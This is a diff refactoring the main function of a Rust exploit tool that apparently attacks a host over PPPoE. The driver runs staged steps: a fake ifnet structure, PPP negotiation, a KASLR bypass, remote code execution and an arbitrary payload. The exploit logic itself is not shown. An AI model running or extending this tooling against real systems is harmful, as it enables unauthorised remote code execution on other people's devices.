@@ -2,7 +2,7 @@ mod constants;
 mod exploit;
 mod parser;
 
-use exploit::Exploit;
+use exploit::{build_fake_ifnet, Exploit};
 use parser::{get_args, Args};
 use pnet::datalink::{self};
 
@@ -25,13 +25,7 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
 
     // Exploit
     let mut expl = Exploit {
-        source_mac: [0; 6], // Using array initialization
-        target_mac: [0; 6],
-        pppoe_softc: 0,
-        host_uniq: [0; 8],
-        target_ipv6: [0; 16],
-        source_ipv6: [0; 16],
-        kaslr_offset: 0,
+        exploit_state: exploit::ExploitState::default(),
         stage1: vec![0],
         stage2: vec![0],
     };
@@ -47,7 +41,7 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     // Stages of the exploit
     println!("\n[+] STAGE 0: Initialization");
     expl.capture_first_padi(&interface);
-    let fake_ifnet = expl.build_fake_ifnet();
+    let fake_ifnet = build_fake_ifnet(&mut expl.exploit_state);
     expl.ppp_negotiation(&interface, Some(fake_ifnet));
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
@@ -61,14 +55,13 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     expl.defeat_kaslr(&interface);
     println!("\n[+] STAGE 3: Remote code execution");
     expl.remote_code_exec(&interface);
-    expl.source_mac = constants::SOURCE_MAC;
+    expl.exploit_state.source_mac = constants::SOURCE_MAC;
     expl.ppp_negotiation(&interface, None);
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
     println!("\n[+] STAGE 4: Arbitrary payload execution");
     expl.frag_and_send(&interface);
     println!("\n[+] DONE!");
-
     // Stop the LCP handler
     handler.stop();
 }
